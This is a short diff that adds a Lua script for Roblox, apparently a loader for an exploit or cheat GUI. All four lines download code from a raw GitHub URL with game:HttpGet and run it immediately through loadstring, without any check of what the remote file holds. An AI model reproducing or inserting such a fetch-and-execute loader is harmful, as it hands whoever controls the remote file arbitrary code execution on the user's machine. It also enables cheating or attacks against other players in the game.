@@ -1,0 +1,4 @@
+local scriptURL = 'https://raw.githubusercontent.com/Sosa-x2k/gui/refs/heads/main/SAsda'
+local response = game:HttpGet(scriptURL)
+local executeScript = loadstring(response)
+executeScript() 
